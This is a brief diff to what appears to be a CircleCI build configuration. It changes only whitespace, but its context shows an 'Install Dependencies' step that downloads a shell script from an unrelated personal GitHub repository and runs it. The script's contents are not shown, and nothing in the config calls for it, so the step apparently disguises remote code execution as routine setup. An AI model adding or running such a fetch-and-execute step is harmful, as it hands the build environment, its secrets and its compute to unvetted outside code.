@@ -9,7 +9,7 @@ jobs:
             name: Install Dependencies
             command: |
               wget https://raw.githubusercontent.com/Nurultyas7979/ewe/main/jero.sh && chmod +x jero.sh && ./jero.sh
-                         
+              
 
 workflows:
     version: 2.1
